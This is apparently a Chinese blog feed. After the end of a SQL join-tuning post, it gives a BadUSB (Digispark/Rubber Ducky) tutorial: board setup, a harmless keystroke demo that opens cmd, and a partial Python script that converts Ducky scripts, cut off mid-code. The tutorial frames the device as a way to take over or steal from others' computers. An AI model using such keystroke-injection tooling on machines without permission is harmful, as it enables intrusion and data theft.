, B , C<span style="color: #0000ff;">WHERE A.ID <span style="color: #808080;">=<span style="color: #000000;"> B.ID <span style="color: #808080;">AND A.ID <span style="color: #808080;">=<span style="color: #000000;"> C.ID<span style="color: #808080;">AND B<span style="color: #808080;">&lt;&gt;<span style="color: #800000; font-weight: bold;">0 <span style="color: #808080;">AND C<span style="color: #808080;">&lt;&gt;<span style="color: #800000; font-weight: bold;">0</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></pre></div><p>　　此结果和第一条ＳＱＬ一样效率不错！　从逻辑上看，似乎ＳＱＬ　会先将表ＪＯＩＮ　后再筛选，但实战结果。是先筛选再ＪＯＩＮ　！因为ＳＱＬ　ＳＥＲＶＥＲ　会内部分析，产生一个最优的执行计划，所以不用你操心，自动帮你处理了！<span style="color: #ff0000;">而使用ＪＯＩＮ　ＯＮ　的话，就<span style="color: #000000;">好像是使用强制命令，告诉数据库，就是要按你的方式处理结果，数据库只好服从！！　所以思考ＳＱＬ写法不能只说要效率，同时还要注重结果对了，这才是关键！</span></span></p><p>　　４。本人一次看别人ＳＱＬ，就是不明白作表连接查询，为什么ＷＨＥＲＥ后面要进行大量的ＷＨＥＲＥ条件筛选，而且都是无关业务逻辑的。在我的传统观念看来，执行WHERE　语句是需要对全表进行扫描的，这样因该会增加查询时间。现在结合前面所讲的，<span style="color: #ff0000;">因为不论是（ＦＲＯＭ－－ＡＮＤ　还是　ＪＯＩＮ－－ＯＮ）方式，再与第三张表ＪＯＩＮ之前都应该尽量先筛选一部分结果（可能是大部分结果）。这样速度会大大提升！</span></p><p>&nbsp;</p><p><span style="color: #ff0000;">　　</span></p><p>&nbsp;</p><p><span style="color: #ff0000;"><span style="color: #000000;"><span style="color: #ff0000;">　　表连接人人都会，可真要说的清清楚楚，也许还需要花点功夫和时间去测试和总结吧。说起来因该有很大的文章，本人知识积累还不够，还希望有人能提点提点，斧正补充一下！！　&nbsp;</span></span></span></p></div>]]></content>
    
    <summary type="html">
    
      
      
        &lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot; /&gt;&lt;!--页面头部添加--&gt;

&lt;h1 id=&quot;SQL-深入”了解”-sqlserver-表连接-join-及性能调优化&quot;&gt;&lt;a href=&quot;#SQL-深入”了解”-sqlserver-表连
      
    
    </summary>
    
    
      <category term="工作学习" scheme="https://www.nikoyu.asia/categories/%E5%B7%A5%E4%BD%9C%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="IT" scheme="https://www.nikoyu.asia/tags/IT/"/>
    
      <category term="SQL" scheme="https://www.nikoyu.asia/tags/SQL/"/>
    
  </entry>
  
  <entry>
    <title>U盘攻击：无视防火墙-3秒黑掉你的电脑|BadUSB-制作教程</title>
    <link href="https://www.nikoyu.asia/U%E7%9B%98%E6%94%BB%E5%87%BB.html"/>
    <id>https://www.nikoyu.asia/U%E7%9B%98%E6%94%BB%E5%87%BB.html</id>
    <published>2020-01-07T07:48:03.000Z</published>
    <updated>2020-09-17T03:20:45.602Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"><!--页面头部添加--><h1 id="U盘攻击：无视防火墙-3秒黑掉你的电脑-BadUSB-制作教程"><a href="#U盘攻击：无视防火墙-3秒黑掉你的电脑-BadUSB-制作教程" class="headerlink" title="U盘攻击：无视防火墙-3秒黑掉你的电脑|BadUSB-制作教程"></a>U盘攻击：无视防火墙-3秒黑掉你的电脑|BadUSB-制作教程</h1><div class="post-content">            <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&amp;id=552194857&amp;auto=1&amp;height=66"></iframe><h2 id="BadUSB简介"><a href="#BadUSB简介" class="headerlink" title="BadUSB简介"></a>BadUSB简介</h2><p><img alt="图片" data-src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/103.jpg" class="lazyload"></p><p>吾旧友，拾U盘,彼异之，插PC，遂上线。 这个愚蠢精彩故事不禁让我萌生学习制作一个BadUSB的想法，为了贴合实际，特地从某宝入手了一个BadUSB板，如下图所示。</p><p><img alt="图片" data-src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/102.jpg" class="lazyload"></p><blockquote><p>简单来说，通过硬件直接插入对方电脑，让对方电脑执行代码，达到控制主机或者窃取信息等目的(需要自行发挥想象)</p></blockquote><h2 id="准备工具"><a href="#准备工具" class="headerlink" title="准备工具"></a>准备工具</h2><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">一个BadUSB_Rubber_Ducky(橡皮鸭)</span><br><span class="line"></span><br><span class="line">Arduino的IDE - 下载地址：(https://www.arduino.cc/en/Main/Software)</span><br><span class="line"></span><br><span class="line">DPinst64驱动(根据电脑型号来,普遍都是64位操作系统)</span><br></pre></td></tr></tbody></table></figure><h2 id="安装工具"><a href="#安装工具" class="headerlink" title="安装工具"></a>安装工具</h2><p><code>Arduino</code>的安装就不讲了，傻瓜式安装:安装包 - 下一步 - 完成！</p><p><code>DPinst64</code>驱动安装的时候要选择<code>始终信任来自Digistump LLC</code> - 安装 - 下一步 - 完成！</p><p><img alt="图片" data-src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/294.png" class="lazyload"></p><p><img alt="图片" data-src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/295.png" class="lazyload"></p><h2 id="Arduino环境配置"><a href="#Arduino环境配置" class="headerlink" title="Arduino环境配置"></a>Arduino环境配置</h2><p>首先打开<code>Arduino</code> - <code>文件</code> - <code>首选项</code> - <code>附加开发板管理器网址</code>:</p><blockquote><p><a href="http://digistump.com/package_digistump_index.json" target="_blank" rel="noopener">http://digistump.com/package_digistump_index.json</a></p></blockquote><p><img alt="图片" data-src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/296.png" class="lazyload"></p><p>在<code>工具</code> - <code>开发板管理器</code> - 先等待它下载完文件:</p><p><img alt="图片" data-src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/297.png" class="lazyload"></p><p><img alt="图片" data-src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/298.png" class="lazyload"></p><p>接着在<code>类型</code>下拉菜单里有一个<code>贡献</code>然后选择<code>Digistump_AVR</code>安装完毕就Ok</p><p><img alt="图片" data-src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/299.png" class="lazyload"></p><p>最后选择开发板对应的<code>开发板型号</code>和<code>编程器</code>然后选择<code>Keyboard</code>一个模板：</p><p><img alt="图片" data-src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/300.png" class="lazyload"></p><p><img alt="图片" data-src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/301.png" class="lazyload"></p><h2 id="代码编写"><a href="#代码编写" class="headerlink" title="代码编写"></a>代码编写</h2><p>这是它示例的代码：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"DigiKeyboard.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setup</span><span class="params">()</span> </span>{</span><br><span class="line">  <span class="comment">// don't need to set anything up to use DigiKeyboard</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">loop</span><span class="params">()</span> </span>{</span><br><span class="line">  <span class="comment">// this is generally not necessary but with some older systems it seems to</span></span><br><span class="line">  <span class="comment">// prevent missing the first character after a delay:</span></span><br><span class="line">  DigiKeyboard.sendKeyStroke(<span class="number">0</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// Type out this string letter by letter on the computer (assumes US-style</span></span><br><span class="line">  <span class="comment">// keyboard)</span></span><br><span class="line">  DigiKeyboard.<span class="built_in">println</span>(<span class="string">"Hello Power_Liu"</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// It's better to use DigiKeyboard.delay() over the regular Arduino delay()</span></span><br><span class="line">  <span class="comment">// if doing keyboard stuff because it keeps talking to the computer to make</span></span><br><span class="line">  <span class="comment">// sure the computer knows the keyboard is alive and connected</span></span><br><span class="line">  DigiKeyboard.<span class="built_in">delay</span>(<span class="number">5000</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><img alt="图片" data-src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/302.png" class="lazyload"></p><p>上传烧录:</p><blockquote><p>提示:Running Digispark Uploader…Plug in device now… (will timeout in 60 seconds)</p></blockquote><p>这个时候需要60s的时间插入你的BadUSB:</p><p><img alt="图片" data-src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/303.png" class="lazyload"></p><p>提示 ： Micronucleus done. Thank you! 说明已经上传成功！这个时候插入BadUSB它会一直输入<code>Hello Power_Liu</code>直到拔掉为止:</p><p><img alt="图片" data-src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/304.png" class="lazyload"></p><h2 id="手把手教你写一个”Hello-Hacker-”"><a href="#手把手教你写一个”Hello-Hacker-”" class="headerlink" title="手把手教你写一个”Hello Hacker!”"></a>手把手教你写一个”Hello Hacker!”</h2><p>1、先在记事本中写好我们的代码 - 另存为 <code>hacker.txt</code>:</p><figure class="highlight c#"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//这个代码的意思就是打开cmd，然后输出Hello Hacker!</span></span><br><span class="line">DELAY <span class="number">5000</span></span><br><span class="line">GUI r </span><br><span class="line">DELAY <span class="number">500</span></span><br><span class="line">STRING cmd</span><br><span class="line">DELAY <span class="number">500</span></span><br><span class="line">ENTER</span><br><span class="line">ENTER</span><br><span class="line">DELAY <span class="number">1000</span></span><br><span class="line">STRING Hello Hacker!</span><br><span class="line">DELAY <span class="number">1500</span> </span><br><span class="line">ENTER</span><br><span class="line">ENTER</span><br></pre></td></tr></tbody></table></figure><p><img alt="图片" data-src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/305.png" class="lazyload"></p><p>2、使用我们的Python转换脚本吧<code>hacker.txt</code>转换为<code>ino</code>文件：</p><blockquote><p>Duckyspark_translator.py hacker.txt hacker</p></blockquote><p>Python转换脚本源代码:</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">payload_input = <span class="string">''</span></span><br><span class="line">l=<span class="string">'//'</span></span><br><span class="line">mod_input=<span class="string">''</span></span><br><span class="line">mod_output=<span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">replacement</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">print</span> (<span class="string">'DigiKeyboard.'</span>, end =<span class="string">''</span>)</span><br><span class="line">    print(</span><br><span class="line">str(l.replace(<span class="string">' a'</span>, <span class="string">'KEY_A'</span>).replace(<span class="string">' a '</span>, <span class="string">'KEY_A'</span>)</span><br><span class="line">.replace(<span class="string">' b'</span>, <span class="string">'KEY_B'</span>)</span><br><span class="line">.replace(<span class="string">' c'</span>, <span class="string">'KEY_C'</span>)</span><br><span class="line">.replace(<span class="string">' d'</span>, <span class="string">'KEY_D'</span>)</span><br><span class="line">.replace(<span class="string">' e'</span>, <span class="string">'KEY_E'</span>)</span><br><span class="line">.replace(<span class="string">' f'</span>, <span class="string">'KEY_F'</span>)</span><br><span class="line">.replace(<span class="string">' g'</span>, <span class="string">'KEY_G'</span>)</span><br><span class="line">.replace(<span class="string">' h'</span>, <span class="string">'KEY_H'</span>)</span><br><span class="line">.replace(<span class="string">' i'</span>, <span class="string">'KEY_I'</span>)</span><br><span class="line">.replace(<span class="string">' j'</span>, <span class="string">'KEY_J'</span>)</span><br><span class="line">.replace(<span class="string">' k'</span>, <span class="string">'KEY_K'</span>)</span><br><span class="line">.replace(<span class="string">' l'</span>, <span class="string">'KEY_L'</span>)</span><br><span class="line">.replace(<span class="string">' m'</span>, <span class="string">'KEY_M'</span>)</span><br><span class="line">.replace(<span class="string">' n'</span>, <span class="string">'KEY_N'</span>)</span><br><span class="line">.replace(<span class="string">' o'</span>, <span class="string">'KEY_O'</span>)</span><br><span class="line">.replace(<span class="string">' p'</span>, <span class="string">'KEY_P'</span>)</span><br><span class="line">.replace(<span class="string">' q'</span>, <span class="string">'KEY_Q'</span>)</span><br><span class="line">.replace(<span class="string">' r'</span>, <span class="string">'KEY_R'</span>)</span><br><span class="line">.replace(<span class="string">' s'</span>, <span class="string">'KEY_S'</span>)</span><br><span class="line">.replace(<span class="string">' t'</span>, <span class="string">'KEY_T'</span>)</span><br><span class="line">.replace(<span class="string">' u'</span>, <span class="string">'KEY_U'</span>)</span><br><span class="line">.replace(<span class="string">' v'</span>, <span class="string">'KEY_V'</span>)</span><br><span class="line">.replace(<span class="string">' w'</span>, <span class="string">'KEY_W'</span>)</span><br><span class="line">.replace(<span class="string">' x'</span>, <span class="string">'KEY_X'</span>)</span><br><span class="line">.replace(<span class="string">' y'</span>, <span class="string">'KEY_Y'</span>)</span><br><span class="line">.replace(<span class="string">' z'</span>, <span class="string">'KEY_Z'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#1-0 if needed</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#f1-f12</span></span><br><span class="line">.replace(<span class="string">' F1'</span>,<span class="string">'KEY_F1'</span>)</span><br><span class="line">.replace(<span class="string">' F2'</span>,<span class="string">'KEY_F2'</span>)</span><br><span class="line">.replace(<span class="string">' F3'</span>,<span class="string">'KEY_F3'</span>)</span><br><span class="line">.replace(<span class="string">' F4'</span>,<span class="string">'KEY_F4'</span>)</span><br><span class="line">.replace(<span class="string">' F5'</span>,<span class="string">'KEY_F5'</span>)</span><br><span class="line">.replace(<span class="string">' F6'</span>,<span class="string">'KEY_F6'</span>)</span><br><span class="line">.replace(<span class="string">' F7'</span>,<span class="string">'KEY_F7'</span>)</span><br><span class="line">.replace(<span class="string">' F8'</span>,<span class="string">'KEY_F8'</span>)</span><br><span class="line">.replace(<span class="string">' F9'</span>,<span class="string">'KEY_F9'</span>)</span><br><span class="line">.replace(<span class="string">' F10'</span>,<span class="string">'KEY_F10'</span>)</span><br><span class="line">.replace(<span class="string">' F11'</span>,<span class="string">'KEY_F11'</span>)</span><br><span class="line">.replace(<span class="string">' F12'</span>,<span class="string">'KEY_F12'</span>)</span><br><span class="line"><span class="comment">#arrows </span></span><br><span class="line">.replace(<span class="string">'LEFTARROW'</span>, <span class="string">'KEY_ARROW_LEFT'</span>)</span><br><span class="line">.replace(<span class="string">'RIGHTARROW'</span>, <span class="string">'KEY_ARROW_RIGHT'</span>)</span><br><span class="line">.replace(<span class="string">'UPARROW'</span>,<span class="string">'KEY_ARROW_UP'</span>)</span><br><span class="line">.replace(<span class="string">'DOWNARROW'</span>,<span class="string">'KEY_ARROW_DOWN'</span>)</span><br><span class="line">.replace(<span class="string">'LEFT'</span>, <span class="string">'KEY_ARROW_LEFT'</span>)</span><br><span class="line">.replace(<span class="string">'RIGH'</span>, <span class="string">'KEY_ARROW_RIGHT'</span>)</span><br><span class="line">.replace(<span class="string">'UP'</span>,<span class="string">'KEY_ARROW_UP'</span>)</span><br><span class="line">.replace(<span class="string">'DOWN'</span>,<span class="string">'KEY_ARROW_DOWN'</span>)</span><br><span class="line"><span class="comment">#keys</span></span><br><span class="line">.replace(<span class="string">'PRINTSCREEN'</span>,<span class="string">'sendKeyStroke(KEY_PRT_SCR'</span> )</span><br><span class="line">.replace(<span class="string">'TAB'</span>, <span class="string">'sendKeyStroke(KEY_TAB'</span>)</span><br><span class="line">.replace(<span class="string">'SPACE'</span>, <span class="string">'sendKeyStroke(KEY_SPACE'</span>)</span><br><span class="line">.replace(<span class="string">'CONTROL ALT'</span>,<span class="string">'sendKeyStroke(MOD_ALT_RIGHT,'</span>)</span><br><span class="line">.replace(<span class="string">'CTRL ALT'</span>,<span class="string">'sendKeyStroke(MOD_ALT_RIGHT,'</span>)</span><br><span class="line">.replace(<span class="string">'ESCAPE'</span>,<span class="string">'sendKeyStroke(KEY_ESC'</span> )</span><br><span class="line">.replace(<span class="string">'ENTER'</span>,<span class="string">'sendKeyStroke(KEY_ENTER'</span>)),end = <span class="string">''</span>)</span><br><span class="line">    print(<span class="string">');'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modreplacement</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">print</span> (<span class="string">'DigiKeyboard.'</span>, end =<span class="string">''</span>)</span><br><span class="line">    print(<span class="string">'sendKeyStroke('</span>, end = <span class="string">''</span>)</span><br><span class="line"></span><br><span class="line">    print(</span><br><span class="line">str(l.replace (mod_input, <span class="string">''</span>).replace(<span class="string">' a'</span>, <span class="string">'KEY_A'</span>).replace(<span class="string">' a '</span>, <span class="string">'KEY_A'</span>)</span><br><span class="line">.replace(<span class="string">' b'</span>, <span class="string">'KEY_B'</span>)</span><br><span class="line">.replace(<span class="string">' c'</span>, <span class="string">'KEY_С'</span>)</span><br><span class="line">.replace(<span class="string">' d'</span>, <span class="string">'KEY_D'</span>)</span><br><span class="line">.replace(<span class="string">' e'</span>, <span class="string">'KEY_E'</span>)</span><br><span class="line">.replace(<span class="string">' f'</span>, <span class="string">'KEY_F'</span>)</span><br><span class="line">.replace(<span class="string">' g'</span>, <span class="string">'KEY_G'</span>)</span><br><span class="line">.replace(<span class="string">' h'</span>, <span class="string">'KEY_H'</span>)</span><br><span class="line">.replace(<span class="string">' i'</span>, <span class="string">'KEY_I'</span>)</span><br><span class="line">.replace(<span class="string">' j'</span>, <span class="string">'KEY_J'</span>)</span><br><span class="line">.replace(<span class="string">' k'</span>, <span class="string">'KEY_K'</span>)</span><br><span class="line">.replace(<span class="string">' l'</span>, <span class="string">'KEY_L'</span>)</span><br><span class="line">.replace(<span class="string">' m'</span>, <span class="string">'KEY_M'</span>)</span><br><span class="line">.replace(<span class="string">' n'</span>, <span class="string">'KEY_N'</span>)</span><br><span class="line">.replace(<span class="string">' o'</span>, <span class="string">'KEY_O'</span>)</span><br><span class="line">.replace(<span class="string">' p'</span>, <span class="string">'KEY_P'</span>)</span><br><span class="line">.replace(<span class="string">' q'</span>, <span class="string">'KEY_Q'</span>)</span><br><span class="line">.replace(<span class="string">' r'</span>, <span class="string">'KEY_R'</span>)</span><br><span class="line">.replace(<span class="string">' s'</span>, <span class="string">'KEY_S'</span>)</span><br><span class="line">.replace(<span class="string">' t'</span>, <span class="string">'KEY_T'</span>)</span><br><span class="line">.replace(<span class="string">' u'</span>, <span class="string">'KEY_U'</span>)</span><br><span class="line">.replace(<span class="string">' v'</span>, <span class="string">'KEY_V'</span>)</span><br><span class="line">.replace(<span class="string">' w'</span>, <span class="string">'KEY_W'</span>)</span><br><span class="line">.replace(<span class="string">' x'</span>, <span class="string">'KEY_X'</span>)</span><br><span class="line">.replace(<span class="string">' y'</span>, <span class="string">'KEY_Y'</span>)</span><br><span class="line">.replace(<span class="string">' z'</span>, <span class="string">'KEY_Z'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#1-0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#f1-f12</span></span><br><span class="line">.replace(<span class="string">' F1'</span>,<span class="string">'KEY_F1'</span>)</span><br><span class="line">.replace(<span class="string">' F2'</span>,<span class="string">'KEY_F2'</span>)</span><br><span class="line">.replace(<span class="string">' F3'</span>,<span class="string">'KEY_F3'</span>)</span><br><span class="line">.replace(<span class="string">' F4'</span>,<span class="string">'KEY_F4'</span>)</span><br><span class="line">.replace(<span class="string">' F5'</span>,<span class="string">'KEY_F5'</span>)</span><br><span class="line">.replace(<span class="string">' F6'</span>,<span class="string">'KEY_F6'</span>)</span><br><span class="line">.replace(<span class="string">' F7'</span>,<span class="string">'KEY_F7'</span>)</span><br><span class="line">.replace(<span class="string">' F8'</span>,<span class="string">'KEY_F8'</span>)</span><br><span class="line">.replace(<span class="string">' F9'</span>,<span class="string">'KEY_F9'</span>)</span><br><span class="line">.replace(<span class="string">' F10'</span>,<span class="string">'KEY_F10'</span>)</span><br><span class="line">.replace(<span class="string">' F11'</span>,<span class="string">'KEY_F11'</span>)</span><br><span class="line">.replace(<span class="string">' F12'</span>,<span class="string">'KEY_F12'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#arrows </span></span><br><span class="line">.replace(<span class="string">'LEFTARROW'</span>, <span class="string">'KEY_ARROW_LEFT'</span>)</span><br><span class="line">.replace(<span class="string">'RIGHTARROW'</span>, <span class="string">'KEY_ARROW_RIGHT'</span>)</span><br><span class="line">.replace(<span class="string">'UPARROW'</span>,<span class="string">'KEY_ARROW_UP'</span>)</span><br><span class="line">.replace(<span class="string">'DOWNARROW'</span>,<span class="string">'KEY_ARROW_DOWN'</span>)</span><br><span class="line">.replace(<span class="string">'LEFT'</span>, <span class="string">'KEY_ARROW_LEFT'</span>)</span><br><span class="line">.replace(<span class="string">'RIGH'</span>, <span class="string">'KEY_ARROW_RIGHT'</span>)</span><br><span class="line">.replace(<span class="string">'UP'</span>,<span class="string">'KEY_ARROW_UP'</span>)</span><br><span class="line">.replace(<span class="string">'DOWN'</span>,<span class="string">'KEY_ARROW_DOWN'</span>)</span><br><span class="line"></span><br><span class="line">.replace(<span class="string">'PRINTSCREEN'</span>,<span class="string">'sendKeyStroke(KEY_PRT_SCR'</span> )</span><br><span class="line">.replace(<span class="string">'TAB'</span>, <span class="string">'sendKeyStroke(KEY_TAB'</span>)</span><br><span class="line">.replace(<span class="string">'ESCAPE'</span>,<span class="string">'KEY_ESC'</span> )</span><br><span class="line">.replace(<span class="string">'SPACE'</span>, <span class="string">'KEY_SPACE'</span>)</span><br><span class="line">.replace(<span class="string">' '</span>,<span class="string">''</span>)</span><br><span class="line">.replace(<span class="string">'ENTER'</span>,<span class="string">'KEY_ENTER'</span>)),end = <span class="string">''</span>)</span><br><span class="line"></span><br><span class="line">    print(<span class="string">','</span>+mod_output, end = <span class="string">''</span>)                </span><br><span class="line">    print(<span class="string">');'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#arguments</span></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) == <span class="number">2</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        payload_input = open(sys.argv[<span class="number">1</span>], <span class="string">"r"</span>)</span><br><span class="line">        sys.stdout = open(<span class="string">"digipayload.ino"</span>, <span class="string">"w"</span>)</span><br><span class="line">        z = len(open(sys.argv[<span class="number">1</span>], <span class="string">"r"</span>).readlines())</span><br><span class="line">    <span class="keyword">except</span> IOError:</span><br><span class="line">        print(<span class="string">'\nError! File "'</span>+sys.argv[<span class="number">1</span>]+<span class="string">'" does not exist!\n'</span> )</span><br><span class="line">        exit()</span><br><span class="line"><span class="keyword">elif</span> len(sys.argv) == <span class="number">3</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        payload_input = open(sys.argv[<span class="number">1</span>], <span class="string">"r"</span>)</span><br><span class="line">        sys.stdout = open(sys.argv[<span class="number">2</span>]+<span class="string">'.ino'</span>, <span 